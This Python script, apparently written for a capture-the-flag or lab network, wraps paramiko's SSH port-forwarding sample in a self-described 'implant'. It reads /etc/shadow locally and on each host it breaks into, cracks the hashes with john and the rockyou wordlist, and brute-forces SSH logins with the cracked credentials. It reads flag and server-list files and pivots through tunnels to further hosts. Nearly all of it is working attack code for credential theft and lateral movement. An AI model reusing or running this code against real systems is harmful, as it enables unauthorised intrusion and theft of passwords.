#!/usr/bin/env python

"""
Sample script showing how to do local port forwarding over paramiko.
This script connects to the requested SSH server and sets up local port
forwarding (the openssh -L option) from a local port through a tunneled
connection to a destination reachable from the SSH server machine.
"""

import getpass
import os
import socket
import select
import subprocess

import thread
import time

try:
    import SocketServer
except ImportError:
    import socketserver as SocketServer

import sys
from optparse import OptionParser

import paramiko

SSH_PORT = 22
DEFAULT_PORT = 4000

g_verbose = True


print("[*] STARTING IMPLANT")

class ForwardServer(SocketServer.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True


class Handler(SocketServer.BaseRequestHandler):
    def handle(self):
        try:
            chan = self.ssh_transport.open_channel(
                "direct-tcpip",
                (self.chain_host, self.chain_port),
                self.request.getpeername(),
            )
        except Exception as e:
            verbose(
                "Incoming request to %s:%d failed: %s"
                % (self.chain_host, self.chain_port, repr(e))
            )
            return
        if chan is None:
            verbose(
                "Incoming request to %s:%d was rejected by the SSH server."
                % (self.chain_host, self.chain_port)
            )
            return

        verbose(
            "Connected!  Tunnel open %r -> %r -> %r"
            % (
                self.request.getpeername(),
                chan.getpeername(),
                (self.chain_host, self.chain_port),
            )
        )
        while True:
            r, w, x = select.select([self.request, chan], [], [])
            if self.request in r:
                data = self.request.recv(1024)
                if len(data) == 0:
                    break
                chan.send(data)
            if chan in r:
                data = chan.recv(1024)
                if len(data) == 0:
                    break
                self.request.send(data)

        peername = self.request.getpeername()
        chan.close()
        self.request.close()
        verbose("Tunnel closed from %r" % (peername,))


def forward_tunnel(local_port, remote_host, remote_port, transport):
    # this is a little convoluted, but lets me configure things for the Handler
    # object.  (SocketServer doesn't give Handlers any way to access the outer
    # server normally.)
    class SubHander(Handler):
        chain_host = remote_host
        chain_port = remote_port
        ssh_transport = transport

    ForwardServer(("", local_port), SubHander).serve_forever()


def verbose(s):
    if g_verbose:
        print(s)


HELP = """\
Set up a forward tunnel across an SSH server, using paramiko. A local port
(given with -p) is forwarded across an SSH session to an address:port from
the SSH server. This is similar to the openssh -L option.
"""


def get_host_port(spec, default_port):
    "parse 'hostname:22' into a host and port, with the port optional"
    args = (spec.split(":", 1) + [default_port])[:2]
    args[1] = int(args[1])
    return args[0], args[1]

found_users = []
found_hosts = []
found_passwords = []

found_userpass = []
visited = []

flags = []

def print_hosts():
    for host in found_hosts:
        print("[*] Printing Host: {}".format(host))


'''
Given the string of the /etc/passwd file, extract the passes and crack them with john.
'''
def crack_pass(in_passwd):
    john_wordlist = "/usr/share/wordlists/rockyou.txt"

    #with open(john_wordlist, "r"):
    #print('[*] CRACKNG: \n{}'.format( in_passwd ))

    try:
        os.system('touch hashes.txt')

        with open('hashes.txt', 'a') as f:
            f.write(str(in_passwd) + "\n")
            #os.system('echo "{}" >> hashes.txt'.format( str(in_passwd) ))
        f.close()

        os.system('john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt > /dev/null 2>&1')

        john_output = os.system('john --show hashes.txt > john_out.txt')

        john_file = open("john_out.txt", "r")
        for line in john_file:
            if(':' in line):
                user_str = str(line.split(":")[0])
                pass_str = str(line.split(":")[1])

                # user_pass_str = '{}:{}'.format( user_str, pass_str )
                # if( user_pass_str not in found_userpass ):
                #     found_userpass.append( str(user_pass_str) )

                if( user_str not in found_users ):
                    print('[*] Password Cracked: {}:{}'.format( user_str, pass_str ))
                    found_users.append( str(user_str) )

                if( pass_str not in found_passwords ):
                    found_passwords.append( str(pass_str) )

    except Exception as e:
        print('[-] Error: {}'.format( e ))


# def extract_usernames(in_passwd):
#     new_user = str(in_passwd).split(':')
#     if( new_user[2] not in found_users and ( int(new_user[2]) > 999 or int(new_user[2]) == 0 ) and int(new_user[2]) != 65534):
#         print('[*] New User: {}'.format( new_user[0] ))
#         found_users.append( str(new_user[0]) )

#         #crack the passes with john
#         crack_pass( str(in_passwd) )

def search_hosts(client, userpass_s):
    stdin, stdout, stderr = client.exec_command('cat servers.txt')

    stdout_str = str(stdout.read().decode("utf8"))
    err_str = str(stderr.read().decode("utf8"))

    if( err_str == "" ):
        print('[*] Read Servers File: \n{}'.format( stdout_str ))
        print('[*] Parsing target file.')

        for host in stdout_str.split():
            found_hosts.append( host )
            print('[+] Host found: {}'.format( host ))
    else:
        print('err: {}'.format( err_str ))
    
    stdin, stdout, stderr = client.exec_command('cat /etc/shadow')

    stdout_str = str(stdout.read().decode("utf8"))
    err_str = str(stderr.read().decode("utf8"))

    if( err_str == "" ):
        #print('[*] Read shadow File: \n{}'.format( stdout_str.split('\n') ))
        print('[*] Cracking passwords...')
        
        stdout_str_split = stdout_str.split('\n')
        
        for p in stdout_str_split:
            pass_str = str(p).split(':')
            pass_hash = pass_str[1]

            if(pass_hash != "*" and pass_hash != "!" and pass_hash != "!!"):
                #print('[*] NEW PAS: \n{}'.format( str(p) ))
                crack_pass( str(p) )
    else:
        print('err: {}'.format( err_str ))

    stdin, stdout, stderr = client.exec_command('cat /flag.txt')
    stdout_str = str(stdout.read().decode("utf8"))
    err_str = str(stderr.read().decode("utf8"))

    if( err_str == "" ):
        print('[*] Reading Flag.')
        
        if(stdout_str not in flags):
            flags.append(stdout_str)
    else:
        print('err: {}'.format( err_str ))

    #add this host to visited so we dont scan it anymore, remove from userpass
    if( userpass_s not in visited ):
        visited.append(userpass_s)
        found_userpass.remove( userpass_s )
        
        remove_host = '{}:{}'.format( str(userpass_s.split(':')[1]), str(userpass_s.split(':')[2]) )
        print('[*] Removing: {}'.format( remove_host ) )
        found_hosts.remove( remove_host )


        print('[*] Scan Finished for {}\n'.format(userpass_s))

def scan_client(client):
    try:
        for host_s in found_hosts:

            ip_addr_s = host_s.split(':')[0]
            port_s = int(host_s.split(':')[1])

            #print('[*] {}:{}'.format( ip_addr_s, port_s ))

            for user_s in found_users:
                for pass_s in found_passwords:
                    #inital connection
                    try:
                        #check if we visited
                        userpass_s = '{}:{}:{}'.format( user_s, host_s, pass_s )

                        if (userpass_s not in found_hosts):
                            print('[*] Trying {}'.format( userpass_s ))

                            #get_hosts(client)
                            if(client.connect(ip_addr_s, port_s, username=user_s, password=pass_s, timeout=1) == None):
                                print('[*] Logged in: {}@{} = {}'.format( user_s, host_s, pass_s ))
                                if(userpass_s not in found_userpass and userpass_s not in visited):
                                    print('[*] New Login: {}:{} = {}'.format( user_s, host_s, pass_s ))
                                    found_userpass.append( userpass_s )

                                    search_hosts(client, userpass_s)
                                    #client.close()

                    except Exception as e:
                        print("[!] {}".format(e))
        
        print('[*] Scan Done!')

        print('[*] Hosts: {}'.format( found_hosts ))
        print('[*] Users: {}'.format( found_users ))
        print('[*] Passwords: {}'.format( found_passwords ))
        print('[*] User Passes: {}'.format( found_userpass ))
        print('[*] Visited: {}'.format( visited ))

    except Exception as e:
        print("[-] Fatal error: %r" % e)
        sys.exit(1)

def main():

    server = ('10.2.0.2', 111)
    remote = ('10.3.0.2', 222)

    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #crack the local passes first
    passwd_file = open("/etc/shadow", "r")
    for p in passwd_file:
        pass_str = str(p).split(':')

        pass_hash = pass_str[1]

        if(pass_hash != "*" and pass_hash != "!" and pass_hash != "!!"):
            crack_pass( str(p) )

    #get inital hosts
    servers_file = open("servers.txt", "r")
    for host in servers_file:
        host = host.split('\n')[0] 
        if( host not in found_hosts ):
            #print('[*] Host: {}'.format( host ))
            found_hosts.append( host )

    #print_hosts()
    #thread off the forward tunnel cmd
    #store forwarder machine + local port to a queue
    #print('[*] Hosts: {}'.format( found_hosts ))
    #get_hosts(client)

    port_num = 4000
    while( len(visited) == 0 and len(found_hosts) > 0 ):
        print("[*] Scan everything else")

        scan_client(client)
        
        try:
            print('[*] Begin Threading.')

            #client.connect('10.2.0.2', '111', username='alice', password='12345')
            #thread this

            #for each known host, scan retreived hosts
            for known_host in visited:

                user_s = known_host.split(':')[0]
                ip_addr_s = known_host.split(':')[1]
                port_s = int(known_host.split(':')[2])
                pass_s = known_host.split(':')[3]

                print('[*] Connect to known Host: {} {} {} {}'.format( user_s, ip_addr_s, port_s, pass_s ))

                client.connect(ip_addr_s, port_s, username=user_s, password=pass_s)

                '''
                stdin, stdout, stderr = client.exec_command('cat servers.txt')

                stdout_str = str(stdout.read().decode("utf8"))
                err_str = str(stderr.read().decode("utf8"))
                '''

                
                for host_s in found_hosts:
                    
                    #dont thread self
                    if( host_s != ip_addr_s ):
                        ip_addr_s = host_s.split(':')[0]
                        port_s = int(host_s.split(':')[1])

                        print('[*] Starting Thread on port {} for {}'.format( port_num, host_s ))
                        try:
                            thread.start_new_thread( forward_tunnel, (port_num, ip_addr_s, port_s, client.get_transport()) )
                            while True:
                                pass
                        except Exception as e:
                            print("[*] Unable to start thread", str(e))

                        try:
                            for user_known in visited:
                                user_s = user_known.split(':')[0]
                                pass_s = user_known.split(':')[3]

                                client.connect('127.0.0.1', port_num, username=user_s, password=pass_s)
                                print('[!] We must go deeper!')
                                scan_client(client)

                                #call the big one but check that you have visited.
                                
                                #scan_client(client)

                                port_num += 1
                
                                #joe
                                #thread.start_new_thread( forward_tunnel, ( 4001, '10.5.0.2', 444, client.get_transport()) )

                                #now loop throuhgh each of the clients via the ports
                                
                        except:
                            print("[-] Timeout")

        except KeyboardInterrupt:
            print("C-c: Port forwarding stopped.")
            sys.exit(0)

if __name__ == "__main__":
    main()